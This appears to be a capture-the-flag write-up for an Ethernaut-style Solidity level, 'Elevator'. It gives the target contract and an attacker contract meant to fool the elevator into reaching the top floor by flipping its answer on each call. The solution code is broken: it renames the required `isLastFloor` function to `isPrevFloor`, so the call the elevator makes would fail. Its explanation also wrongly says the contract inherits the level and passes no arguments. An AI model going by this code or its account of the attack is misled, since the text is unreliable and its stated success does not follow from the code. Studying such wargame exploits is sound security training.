# Level 11 - Elevator

### Objective

The objective of this level is as follows:

1. Reach the top of the building

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### Solution

In this level, we create a contract called `OurBuilding` that inherits the level contract and allows us to evade `isLastFloor` but not passing in any arguments:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isPrevFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract OurBuilding is Building {
    bool public prev = true;

    function isPrevFloor(uint _n) override external returns (bool) {
        prev = !prev;
        return prev;
    }

    function goToTop(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(1);
    }
}
```

After deploying `OurBuilding` on Remix and calling the `goToTop` function with the level contract address, we can verify that we are at the top floor:

```
await contract.top()


```

Done!
